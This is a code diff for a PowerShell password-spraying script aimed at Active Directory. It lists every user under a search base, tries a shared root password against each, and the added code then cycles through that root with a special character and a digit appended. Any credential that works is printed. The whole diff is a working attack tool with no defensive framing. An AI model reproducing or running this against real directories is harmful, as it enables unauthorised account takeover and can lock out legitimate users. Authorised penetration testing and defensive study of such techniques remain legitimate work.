@@ -5,7 +5,7 @@ Function Test-ADAuthentication {
     (new-object directoryservices.directoryentry "",$username,$password).psbase.name -ne $null
 }
 
-$PasswordToGuess=""
+$PasswordRootToGuess=""
 
 $SearchBase = ""
 
@@ -30,11 +30,37 @@ Write-Host "Searching: " $SearchBase
 # Return a list of usernames
 $Usernames = Get-ADUser -Filter * -SearchBase $SearchBase | Select -Exp SamAccountname
 
+# Iterate through root password
 ForEach ($Username in $Usernames)
 {
-  $guessed = Test-ADAuthentication $Username $PasswordToGuess
+  $guessed = Test-ADAuthentication $Username $PasswordRootToGuess
   If($guessed -Eq "True")
   {
-    Write-Host $Username ": " $guessed
+    Write-Host $Username " - " $PasswordRootToGuess
+  }
+}
+
+# Iterate through passwords permutations
+ForEach ($Username in $Usernames)
+{
+  $guessed = "False"
+  $SpecialCharacters = "!@#$%^&*()".ToCharArray()
+  ForEach($char in $SpecialCharacters)
+  {
+    For($i=0; $i -lt 10; $i++)
+	{
+      $PasswordToGuess = "$PasswordRootToGuess" + "$char" + "$i"
+	
+      $guessed = Test-ADAuthentication $Username $PasswordToGuess
+      If($guessed -Eq "True")
+	  {
+        Write-Host $Username " - " $PasswordToGuess
+		Break
+	  }
+	}
+	If($guessed -Eq "True")
+	{
+	  Break
+	}
   }
 }
